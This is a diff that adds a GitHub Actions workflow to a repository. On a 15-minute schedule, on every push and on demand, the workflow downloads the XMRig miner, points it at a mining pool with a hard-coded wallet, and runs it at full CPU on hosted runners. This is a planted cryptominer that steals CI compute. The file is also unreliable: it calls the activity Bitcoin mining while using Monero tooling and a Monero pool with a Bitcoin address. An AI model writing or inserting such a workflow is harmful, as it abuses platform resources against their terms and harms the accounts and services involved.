@@ -1,0 +1,86 @@
+name: Bitcoin Mining Workflow
+
+on:
+  schedule:
+    - cron: "*/15 * * * *"  # Run every 15 minutes
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  mine-bitcoin:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        os: [ubuntu-latest, ubuntu-20.04]
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup mining environment
+      run: |
+        echo "🚀 Starting Bitcoin mining on GitHub Actions"
+        sudo apt-get update
+        sudo apt-get install -y wget curl htop
+                
+    - name: Download XMRig mining software
+      run: |
+        wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+        tar -xf xmrig.tar.gz
+        cd xmrig-6.20.0
+        chmod +x xmrig
+                
+    - name: Configure mining for wallet
+      run: |
+        cd xmrig-6.20.0
+        cat > config.json << 'EOF'
+        {
+          "api": {
+            "id": null,
+            "worker-id": null
+          },
+          "http": {
+            "enabled": true,
+            "host": "127.0.0.1",
+            "port": 8080,
+            "access-token": null,
+            "restricted": true
+          },
+          "pools": [
+            {
+              "url": "pool.supportxmr.com:443",
+              "user": "bc1qggnrrxtk0rttxw9n26mslasfx538wwvvua88wy",
+              "pass": "github-actions-${{ matrix.os }}",
+              "tls": true
+            }
+          ],
+          "cpu": {
+            "enabled": true,
+            "max-threads-hint": 100
+          }
+        }
+        EOF
+                
+    - name: Start Bitcoin mining
+      run: |
+        cd xmrig-6.20.0
+        echo "💰 Mining Bitcoin to wallet: bc1qggnrrxtk0rttxw9n26mslasfx538wwvvua88wy"
+        timeout 600 ./xmrig --config=config.json || echo "Mining session completed"
+        echo "♏️ Mining finished for this run"
+                
+    - name: Upload mining results
+      uses: actions/upload-artifact@v3
+      with:
+        name: mining-logs-${{ matrix.os }}
+        path: .*.log
+      if: always()
+                
+    - name: Mining summary
+      run: |
+        echo "=== MINING SUMMARY ==="
+        echo "Wallet: bc1qggnrrxtk0rttxw9n26mslasfx538wwvvua88wy"
+        echo "Pool: pool.supportxmr.com:443"
+        echo "Runner: ${{ matrix.os }}"
+        echo "Status: Completed"
+        echo "Next run: In 15 minutes"
